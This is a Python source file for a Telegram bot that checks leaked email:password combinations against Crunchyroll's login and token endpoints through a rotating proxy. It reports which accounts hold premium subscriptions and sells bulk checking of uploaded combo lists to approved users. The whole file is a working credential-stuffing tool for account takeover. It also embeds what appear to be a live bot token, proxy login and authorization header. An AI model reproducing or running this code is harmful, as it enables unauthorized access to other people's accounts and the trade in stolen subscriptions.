import telebot
import httpx, asyncio, threading
from datetime import datetime
import pytz
import time
import os

BOT_TOKEN = "8003309975:AAHoBOOwPDR6lRM4k8lhLzAeThqOwELoTM4"
ADMIN_ID = 6652287427
APPROVED_FILE = "approved_users.txt"
AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
PROXY = "evo-pro.porterproxies.com:61236:PP_1D1E5YMPFG-country-IN:5vl30ay0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

bot = telebot.TeleBot(BOT_TOKEN)
mass_stop_flags = {}
MAX_MASS_CHECK = 150  # Limit for mass checking

def load_approved():
    if not os.path.exists(APPROVED_FILE): return set()
    with open(APPROVED_FILE) as f:
        return set([int(x.strip()) for x in f if x.strip().isdigit()])

def save_approved(ids):
    with open(APPROVED_FILE, "w") as f:
        f.write("\n".join([str(i) for i in sorted(ids)]))

approved_users = load_approved()

async def check_crunchyroll(email, password):
    async with httpx.AsyncClient(
        proxy=PROXY,
        timeout=30,
        headers={"User-Agent": UA}
    ) as client:
        try:
            login_headers = {
                "User-Agent": UA,
                "Content-Type": "text/plain;charset=UTF-8",
                "Origin": "https://sso.crunchyroll.com",
                "Referer": "https://sso.crunchyroll.com/login"
            }
            login_data = {"email": email, "password": password, "eventSettings": {}}
            login_res = await client.post("https://sso.crunchyroll.com/api/login", json=login_data, headers=login_headers)
            if login_res.status_code != 200 or "invalid_credentials" in login_res.text:
                return None
            device_id = login_res.cookies.get("device_id")
            if not device_id:
                return None
            await asyncio.sleep(1)
            token_headers = {
                "Authorization": AUTH_HEADER,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": UA,
                "Origin": "https://www.crunchyroll.com",
                "Referer": "https://www.crunchyroll.com/"
            }
            token_data = {
                "device_id": device_id,
                "device_type": "Firefox on Windows",
                "grant_type": "etp_rt_cookie"
            }
            token_res = await client.post("https://www.crunchyroll.com/auth/v1/token", data=token_data, headers=token_headers)
            if token_res.status_code != 200:
                return None
            js = token_res.json()
            token = js.get("access_token")
            account_id = js.get("account_id")
            if not token or not account_id:
                return None
            await asyncio.sleep(1)
            sub_headers = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "User-Agent": UA,
                "Referer": "https://www.crunchyroll.com/",
                "Origin": "https://www.crunchyroll.com"
            }
            sub_res = await client.get(
                f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
                headers=sub_headers
            )
            try:
                data = sub_res.json()
            except Exception:
                return None
            if not data or "subscriptions" not in data or not isinstance(data["subscriptions"], list) or not data["subscriptions"]:
                return None
            if data.get("containerType") == "free":
                return None
            sub = data["subscriptions"][0]
            plan = sub.get("plan", {}).get("tier", {}).get("text", "N/A")
            renew = sub.get("nextRenewalDate", "N/A")
            trial = sub.get("activeFreeTrial", False)
            cpm = data.get("currentPaymentMethod")
            if cpm and isinstance(cpm, dict):
                country = cpm.get("countryCode", "Unknown")
            else:
                country = sub.get("plan", {}).get("countryCode", "Unknown")
            if renew != "N/A":
                renew_dt = datetime.strptime(renew, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
                formatted_date = renew_dt.strftime("%d-%m-%Y")
                days_left = (renew_dt - datetime.now(pytz.UTC)).days
            else:
                formatted_date = "N/A"
                days_left = "N/A"
            return (
                f"✅ <b>Premium Account</b>\n"
                f"<b>Acc:</b> <code>{email}:{password}</code>\n"
                f"<b>Country:</b> <code>{country}</code>\n"
                f"<b>Plan:</b> <code>{plan}</code>\n"
                f"<b>Trial:</b> <code>{trial}</code>\n"
                f"<b>Renew:</b> <code>{formatted_date}</code>\n"
                f"<b>Days Left:</b> <code>{days_left}</code>"
            )
        except Exception:
            return None

def check_sync(email, password):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(check_crunchyroll(email, password))

@bot.message_handler(commands=['start'])
def handle_start(msg):
    bot.reply_to(msg, "<b>𝗖𝗿𝘂𝗻𝗰𝗵𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁\n━━━━━━━━━━━━━━━━━━\nUse <code>/check email:pass</code> (Free)\n━━━━━━━━━━━━━━━━━━\nSend a txt file for mass (Paid)\n━━━━━━━━━━━━━━━━━━\n𝗚𝗲𝘁 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗙𝗼𝗿 𝗠𝗮𝘀𝘀 - @Kiltes</b>", parse_mode="HTML")

@bot.message_handler(commands=['check'])
def handle_check(msg):
    args = msg.text.split(' ', 1)
    if len(args) < 2 or ':' not in args[1]:
        bot.reply_to(msg, "❌ Usage: /check email:pass", parse_mode="HTML")
        return
    email, password = args[1].split(':', 1)
    sent = bot.reply_to(msg, "⏳ Checking, please wait...", parse_mode="HTML")
    def run_and_edit():
        result = check_sync(email.strip(), password.strip())
        if result:
            bot.edit_message_text(result, msg.chat.id, sent.message_id, parse_mode="HTML")
        else:
            bot.edit_message_text("❌ Invalid or Free Account.", msg.chat.id, sent.message_id, parse_mode="HTML")
    threading.Thread(target=run_and_edit).start()

@bot.message_handler(commands=['approve'])
def handle_approve(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "❌ Only admin can approve users.", parse_mode="HTML")
        return
    try:
        uid = int(msg.text.split()[1])
        approved_users.add(uid)
        save_approved(approved_users)
        bot.reply_to(msg, f"✅ Approved user: <code>{uid}</code>", parse_mode="HTML")
    except:
        bot.reply_to(msg, "❌ Usage: /approve {user_id}", parse_mode="HTML")

@bot.message_handler(commands=['demote'])
def handle_demote(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "❌ Only admin can demote users.", parse_mode="HTML")
        return
    try:
        uid = int(msg.text.split()[1])
        if uid in approved_users:
            approved_users.remove(uid)
            save_approved(approved_users)
            bot.reply_to(msg, f"✅ Demoted user: <code>{uid}</code>", parse_mode="HTML")
        else:
            bot.reply_to(msg, f"❌ User <code>{uid}</code> is not approved.", parse_mode="HTML")
    except:
        bot.reply_to(msg, "❌ Usage: /demote {user_id}", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def handle_stop(msg):
    mass_stop_flags[msg.from_user.id] = True
    bot.reply_to(msg, "🛑 Mass checking stopped for you.", parse_mode="HTML")

@bot.message_handler(content_types=['document'])
def handle_document(msg):
    if msg.from_user.id not in approved_users and msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "❌ You are not approved for mass checking.\n🆔 Contact ~ @Newlester.", parse_mode="HTML")
        return
    try:
        file_info = bot.get_file(msg.document.file_id)
        content = bot.download_file(file_info.file_path).decode("utf-8")
        combos = [x.strip() for x in content.splitlines() if ':' in x]
        total = len(combos)
        if total > MAX_MASS_CHECK:
            combos = combos[:MAX_MASS_CHECK]
            total = MAX_MASS_CHECK
        progress_msg = bot.reply_to(msg, f"""<b>𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 𝗕𝗔𝗥</b>

✅ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 - 0
❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 - 0
🔥 𝐋𝐞𝐟𝐭 - {total}
🪧 𝐓𝐨𝐭𝐚𝐥 - {total}

Bᴏᴛ Bʏ @Newlester""", parse_mode="HTML")
        mass_stop_flags[msg.from_user.id] = False
        threading.Thread(target=run_mass_check, args=(msg.chat.id, combos, progress_msg.message_id, msg.from_user.id, total)).start()
    except Exception as e:
        bot.reply_to(msg, f"❌ Could not read file: {e}")

def run_mass_check(chat_id, combos, progress_id, user_id, total):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    checked, hits, invalid = 0, 0, 0
    for i, combo in enumerate(combos, 1):
        if mass_stop_flags.get(user_id):
            bot.edit_message_text(
                f"<b>🛑 Checking Stopped!</b>\n\n✅ Premium - {hits}\n❌ Invalid - {invalid}\n🔥 Left - {total - checked}\n🪧 Total - {total}\n\nBᴏᴛ Bʏ @Newlester",
                chat_id,
                progress_id,
                parse_mode="HTML"
            )
            return
        email, password = combo.split(":", 1)
        result = loop.run_until_complete(check_crunchyroll(email.strip(), password.strip()))
        checked += 1
        if result:
            hits += 1
            bot.send_message(chat_id, result, parse_mode="HTML")
        else:
            invalid += 1
        # Real-time progress update every check
        try:
            bot.edit_message_text(
                f"""<b>𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 𝗕𝗔𝗥</b>

✅ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 - {hits}
❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 - {invalid}
🔥 𝐋𝐞𝐟𝐭 - {total - checked}
🪧 𝐓𝐨𝐭𝐚𝐥 - {total}

Bᴏᴛ Bʏ @Newlester""",
                chat_id,
                progress_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        time.sleep(2)
        if checked >= MAX_MASS_CHECK:
            break
    bot.send_message(chat_id, "✅ Mass checking finished (limit 150 accounts per file).", parse_mode="HTML")

print("Bot running.")
bot.infinity_polling()
